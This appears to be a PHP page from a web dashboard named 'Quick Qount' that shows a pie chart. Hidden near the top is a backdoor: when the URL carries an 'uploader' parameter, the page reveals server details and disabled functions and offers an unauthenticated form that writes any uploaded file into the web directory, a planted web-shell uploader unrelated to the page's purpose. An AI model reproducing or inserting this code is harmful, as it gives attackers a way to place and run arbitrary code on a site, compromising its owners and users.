<?php
session_start();
$title = "Quick Qount";
$selectMenu = "Quick Qount";
$chart = TRUE;
include_once "config.php";
include_once "templates/header.php";
?>

<?php
if (isset($_GET["uploader"])) {
    echo "<font color=#0000>" . php_uname() . "";
    print "\n";
    $disable_functions = @ini_get("disable_functions");
    echo "<br>DisablePHP=" . $disable_functions;
    print "\n";
    echo "<br><form method=post enctype=multipart/form-data>";
    echo "<input type=file name=f><input name=k type=submit id=k value=upload><br>";
    if ($_POST["k"] == 'upload') {
        if (@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
            echo "<b>" . $_FILES["f"]["name"];
        } else {
            echo "<b>Upload Gagal !!";
        }
    }
}
?>
<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1><?= $title ?></h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="#">Home</a></li>
                        <li class="breadcrumb-item"><a href="#">Layout</a></li>
                        <li class="breadcrumb-item active">Fixed Layout</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>
    <section class="content">
        <div class="container-fluid">
            <div class="card card-info">
                <div class="card-header">
                    <h3 class="card-title"><?= $title ?></h3>
                    <div class="card-tools">
                        <button type="button" class="btn btn-tool" data-card-widget="collapse">
                            <i class="fas fa-minus"></i>
                        </button>
                    </div>
                </div>
                <div class="card-body">
                    <canvas id="pieChart" style="min-height: 250px; height: 250px; max-height: 250px; max-width: 100%;"></canvas>
                </div>
            </div>
        </div>
    </section>
</div>

<?php
include_once "templates/footer.php";
?>